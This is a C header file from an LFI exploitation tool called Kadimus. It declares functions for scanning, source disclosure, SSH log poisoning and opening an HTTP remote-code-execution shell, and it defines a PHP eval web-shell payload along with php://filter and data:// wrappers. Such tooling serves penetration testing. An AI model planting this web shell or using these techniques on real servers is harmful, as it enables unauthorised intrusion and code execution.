#ifndef KAD_XPL
#define KAD_XPL

#include <stdio.h>
#include <unistd.h>
#include <libssh/libssh.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#ifdef __APPLE__
	#include <sys/uio.h>
#else
	#include <sys/io.h>
#endif
#include <sys/mman.h>


#include "kadimus_request.h"
#include "kadimus_mem.h"
#include "kadimus_str.h"
#include "kadimus_common.h"
#include "kadimus_regex.h"
#include "kadimus_io.h"

typedef enum {
	INPUT = 1,
	ENVIRON,
	AUTH,
	DATA
} rce_type;

/*typedef enum {
	SCAN,
	PHP_CODE,
	CMD_CODE,
	SHELL
} op_type;*/

typedef struct {
	char *ssh_host;
	char *vuln_uri;
	char *p_name;
	char *code;
	char *cmd;
	size_t ssh_port;
	rce_type tech;
	bool cmdx;
} xpl_parameters;

#define FILTER_WRAP "php://filter/convert.base64-encode/resource="
#define DATA_WRAP "data://text/plain;base64,"
#define ERROR_FILE "./resource/errors.txt"
#define CHECK_FILES "./resource/common_files.txt"
#define AUTH_LOG_REGEX "^(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\\s\\s?[1-3]?[0-9]\\s\\d+:\\d+:\\d+\\s.*\\ssshd\\[\\d+\\]:\\s.+$"
#define STAIRWAY2HEAVEN "<?php eval(\"?>\".base64_decode($_REQUEST['stairway_to_heaven'])); exit(0); ?>"

int is_dynamic(const char *url);
int common_error_check(const char *uri);
int disclosure_check(const char *uri, const char *xuri);
void scan(const char *target_uri);
void rce_http_shell(const char *rce_uri, rce_type tech, const char *p_name);
void exec_php(xpl_parameters xpl);
void *thread_scan(void *url);
void source_disclosure_get(const char *uri, const char *filename, const char *p_name, FILE *out_file);
bool ssh_log_poison(const char *target, int port);
bool check_auth_poison(const char *target);

#endif
